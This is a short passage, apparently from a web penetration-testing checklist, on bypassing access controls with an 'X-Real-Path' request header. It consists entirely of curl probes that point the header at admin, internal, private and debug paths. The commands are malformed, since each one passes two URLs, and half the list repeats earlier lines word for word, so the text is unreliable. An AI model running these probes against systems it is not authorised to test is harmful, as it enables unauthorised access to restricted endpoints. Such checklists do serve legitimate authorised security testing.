## 17. X-Real-Path — the real path header

```bash
curl -i "$BASE/admin" -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api' "$BASE/" # 200 with the api body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i "$BASE/admin" -H 'X-Real-Path: /api/preview' "$BASE/" # 200 with the api preview body = finding
```
